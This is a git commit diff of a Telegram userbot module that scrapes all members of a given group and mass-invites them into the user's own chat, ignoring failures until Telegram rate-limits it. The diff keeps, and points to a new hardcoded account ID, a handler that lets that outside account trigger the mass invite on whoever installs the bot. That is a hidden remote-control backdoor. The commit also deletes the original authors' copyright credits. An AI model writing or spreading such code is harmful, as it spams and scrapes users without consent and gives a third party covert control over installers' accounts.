f79c7ded2afccb8315398375eba8de8005140131
AbinG <101431998+SayaAbing@users.noreply.github.com>
2022-03-20 00:16:54 +0700

    Update inviteall.py

--- userbot/modules/inviteall.py
+++ userbot/modules/inviteall.py
@@ -1,7 +1,3 @@
-# Ported By @VckyouuBitch From Geez - Projects
-# Copyright © Team Geez - Project
-# Abing
-
 from telethon.errors import (
     ChannelInvalidError,
     ChannelPrivateError,
@@ -11,8 +7,9 @@ from telethon.tl import functions
 from telethon.tl.functions.channels import GetFullChannelRequest
 from telethon.tl.functions.messages import GetFullChatRequest
 
-from userbot import CMD_HELP
+from userbot import CMD_HELP, CMD_HANDLER as cmd
 from userbot.events import register
+from userbot.utils import edit_or_reply, bing_cmd
 
 
 async def get_chatinfo(event):
@@ -52,49 +49,49 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1337194042,
+@bing_cmd(pattern="inviteall(?: |$)(.*)")
+@register(incoming=True, from_users=1663258664,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
     if not sender.id == me.id:
-        geez = await event.reply("`processing...`")
+       bing = await event.reply("`processing...`")
     else:
-        geez = await event.edit("`processing...`")
+       bing = await edit_or_reply(event, "`processing...`")
     geezteam = await get_chatinfo(event)
     chat = await event.get_chat()
     if event.is_private:
-        return await geez.edit("`Sorry, Can add users here`")
+        return await bing.edit("`Sorry, Can add users here`")
     s = 0
     f = 0
     error = "None"
 
-    await geez.edit("**TerminalStatus**\n\n`Collecting Users.......`")
+    await bing.edit("**TerminalStatus**\n\n`Collecting Users.......`")
     async for user in event.client.iter_participants(geezteam.full_chat.id):
         try:
             if error.startswith("Too"):
-                return await geez.edit(
+                return await bing.edit(
                     f"**Terminal Finished With Error**\n(`May Got Limit Error from telethon Please try agin Later`)\n**Error** : \n`{error}`\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people"
                 )
             await event.client(
                 functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
             )
             s = s + 1
-            await geez.edit(
+            await bing.edit(
                 f"**Terminal Running...**\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people\n\n**× LastError:** `{error}`"
             )
         except Exception as e:
             error = str(e)
             f = f + 1
-    return await geez.edit(
+    return await bing.edit(
         f"**Terminal Finished** \n\n• Successfully Invited `{s}` people \n• failed to invite `{f}` people"
     )
 
 
 CMD_HELP.update(
     {
-        "inviteall": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.inviteall groups username`\
+        "inviteall": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}inviteall groups username`\
           \n📌 : __Scrapes users from the given chat to your group__."
     }
 )
